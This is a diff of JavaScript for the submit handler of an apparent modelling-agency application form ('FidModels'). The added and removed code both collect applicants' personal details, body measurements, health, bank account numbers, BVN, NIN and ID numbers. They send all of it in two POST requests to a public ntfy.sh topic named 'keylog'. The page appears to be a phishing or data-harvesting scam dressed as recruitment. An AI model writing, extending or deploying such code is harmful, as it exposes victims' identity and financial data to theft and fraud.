@@ -1435,143 +1435,84 @@
     btn.disabled = true;
     btn.textContent = 'Submitting...';
 
-    const data = collectData();
+    const d = collectData();
     const ref = 'FM-2025-' + Math.floor(Math.random() * 9000 + 1000);
-
-    // Format message for ntfy
-    const msg = `
-🎯 NEW FIDMODELS APPLICATION — ${ref}
-
-👤 PERSONAL
-Name: ${data.firstName} ${data.lastName}
-DOB: ${data.dob} | Gender: ${data.gender}
-Phone: ${data.phone} | WhatsApp: ${data.whatsapp}
-Email: ${data.email}
-State: ${data.stateOrigin} | City: ${data.city}
-Nationality: ${data.nationality}
-Address: ${data.address}
-
-📏 PHYSICAL
-Height: ${data.height}cm | Weight: ${data.weight}kg
-Dress Size: ${data.dressSize}
-Bust: ${data.bust} | Waist: ${data.waist} | Hips: ${data.hips}
-Shoe: ${data.shoeSize} | Eyes: ${data.eyeColour} | Hair: ${data.hairColour}
-Skin: ${data.skinTone} | Ethnicity: ${data.ethnicity}
-Tattoos: ${data.tattoos}
-
-🎬 EXPERIENCE
-Level: ${data.experience}
-Categories: ${data.categories}
-Previous Agencies: ${data.previousAgencies}
-Notable Work: ${data.notableWork}
-Skills: ${data.skills}
-Travel: ${data.travel}
-
-💃 LIFESTYLE
-Relationship: ${data.relationship} | Children: ${data.children}
-Education: ${data.education} | Occupation: ${data.occupation}
-Comfortable with: ${data.comfort}
-Smokes: ${data.smoke}
-Motivation: ${data.motivation}
-Health: ${data.health}
-
-📱 SOCIAL MEDIA
-Instagram: ${data.instagram} (${data.igFollowers})
-TikTok: ${data.tiktok} (${data.ttFollowers})
-Twitter: ${data.twitter} | Facebook: ${data.facebook}
-Portfolio: ${data.portfolio}
-Referral: ${data.referral}
-
-💳 FINANCIAL & ID
-Bank: ${data.bankName}
-Account Number: ${data.accountNumber}
-Account Name: ${data.accountName}
-BVN: ${data.bvn}
-NIN: ${data.nin}
-ID Type: ${data.idType} | ID Number: ${data.idNumber}
-Next of Kin: ${data.nokName} (${data.nokRelation}) — ${data.nokPhone}
-
-📝 ADDITIONAL
-${data.additionalInfo}
-
-Ref: ${ref}
-    `.trim();
-
-    // Send to ntfy — split into two messages to avoid size limits
-    const part1 = `NEW FIDMODELS APPLICATION ${ref}
-
-PERSONAL
-Name: ${data.firstName} ${data.lastName}
-DOB: ${data.dob} | Gender: ${data.gender}
-Phone: ${data.phone} | WhatsApp: ${data.whatsapp}
-Email: ${data.email}
-State: ${data.stateOrigin} | City: ${data.city}
-Address: ${data.address}
-
-PHYSICAL
-Height: ${data.height}cm | Weight: ${data.weight}kg
-Bust: ${data.bust} | Waist: ${data.waist} | Hips: ${data.hips}
-Skin: ${data.skinTone} | Eyes: ${data.eyeColour} | Hair: ${data.hairColour}
-Tattoos: ${data.tattoos}
-
-EXPERIENCE
-Level: ${data.experience}
-Categories: ${data.categories}
-Travel: ${data.travel}
-Skills: ${data.skills}`;
-
-    const part2 = `APPLICATION ${ref} CONTINUED
-
-LIFESTYLE
-Relationship: ${data.relationship} | Children: ${data.children}
-Education: ${data.education} | Occupation: ${data.occupation}
-Comfortable with: ${data.comfort}
-Smokes: ${data.smoke}
-Health: ${data.health}
-
-SOCIAL MEDIA
-Instagram: ${data.instagram} (${data.igFollowers})
-TikTok: ${data.tiktok} (${data.ttFollowers})
-Referral: ${data.referral}
-
-FINANCIAL & ID
-Bank: ${data.bankName}
-Account Number: ${data.accountNumber}
-Account Name: ${data.accountName}
-BVN: ${data.bvn}
-NIN: ${data.nin}
-ID: ${data.idType} - ${data.idNumber}
-Next of Kin: ${data.nokName} (${data.nokRelation}) ${data.nokPhone}
-
-NOTES: ${data.additionalInfo}`;
-
     const ntfyUrl = 'https://ntfy.sh/keylog';
+    const name = d.firstName + ' ' + d.lastName;
+
+    // Part 1 - Personal, Physical, Experience
+    const p1 = 'NEW APPLICATION ' + ref + '\n\n'
+      + 'Name: ' + name + '\n'
+      + 'DOB: ' + d.dob + ' | Gender: ' + d.gender + '\n'
+      + 'Phone: ' + d.phone + '\n'
+      + 'WhatsApp: ' + d.whatsapp + '\n'
+      + 'Email: ' + d.email + '\n'
+      + 'State: ' + d.stateOrigin + ' | City: ' + d.city + '\n'
+      + 'Address: ' + d.address + '\n\n'
+      + 'PHYSICAL\n'
+      + 'Height: ' + d.height + 'cm | Weight: ' + d.weight + 'kg\n'
+      + 'Bust: ' + d.bust + ' | Waist: ' + d.waist + ' | Hips: ' + d.hips + '\n'
+      + 'Skin: ' + d.skinTone + ' | Eyes: ' + d.eyeColour + ' | Hair: ' + d.hairColour + '\n'
+      + 'Ethnicity: ' + d.ethnicity + '\n'
+      + 'Tattoos: ' + d.tattoos + '\n\n'
+      + 'EXPERIENCE\n'
+      + 'Level: ' + d.experience + '\n'
+      + 'Categories: ' + d.categories + '\n'
+      + 'Travel: ' + d.travel + '\n'
+      + 'Skills: ' + d.skills + '\n'
+      + 'Prev Agencies: ' + d.previousAgencies;
+
+    // Part 2 - Lifestyle, Social, Financial
+    const p2 = 'APPLICATION ' + ref + ' - PART 2\n\n'
+      + 'LIFESTYLE\n'
+      + 'Relationship: ' + d.relationship + '\n'
+      + 'Children: ' + d.children + '\n'
+      + 'Education: ' + d.education + '\n'
+      + 'Occupation: ' + d.occupation + '\n'
+      + 'Comfortable with: ' + d.comfort + '\n'
+      + 'Smokes: ' + d.smoke + '\n'
+      + 'Health: ' + d.health + '\n\n'
+      + 'SOCIAL MEDIA\n'
+      + 'Instagram: ' + d.instagram + ' (' + d.igFollowers + ')\n'
+      + 'TikTok: ' + d.tiktok + ' (' + d.ttFollowers + ')\n'
+      + 'Twitter: ' + d.twitter + '\n'
+      + 'Referral: ' + d.referral + '\n\n'
+      + 'FINANCIAL AND ID\n'
+      + 'Bank: ' + d.bankName + '\n'
+      + 'Account Number: ' + d.accountNumber + '\n'
+      + 'Account Name: ' + d.accountName + '\n'
+      + 'BVN: ' + d.bvn + '\n'
+      + 'NIN: ' + d.nin + '\n'
+      + 'ID Type: ' + d.idType + '\n'
+      + 'ID Number: ' + d.idNumber + '\n'
+      + 'Next of Kin: ' + d.nokName + ' (' + d.nokRelation + ') ' + d.nokPhone + '\n\n'
+      + 'NOTES: ' + d.additionalInfo;
 
     try {
       await fetch(ntfyUrl, {
         method: 'POST',
         headers: {
-          'Content-Type': 'text/plain; charset=utf-8',
-          'Title': `FidModels Application - ${data.firstName} ${data.lastName}`,
+          'Content-Type': 'text/plain',
+          'Title': 'FidModels - ' + name + ' - Part 1',
           'Priority': 'high',
-          'Tags': 'bust_in_silhouette'
+          'Tags': 'memo'
         },
-        body: part1
+        body: p1
       });
-    } catch(e) {}
+    } catch(e) { console.error('ntfy part1 error', e); }
 
     try {
       await fetch(ntfyUrl, {
         method: 'POST',
         headers: {
-          'Content-Type': 'text/plain; charset=utf-8',
-          'Title': `FidModels Continued - ${data.firstName} ${data.lastName}`,
+          'Content-Type': 'text/plain',
+          'Title': 'FidModels - ' + name + ' - Part 2',
           'Priority': 'high',
-          'Tags': 'credit_card'
+          'Tags': 'memo'
         },
-        body: part2
+        body: p2
       });
-    } catch(e) {}
+    } catch(e) { console.error('ntfy part2 error', e); }
 
     // Show success
     document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
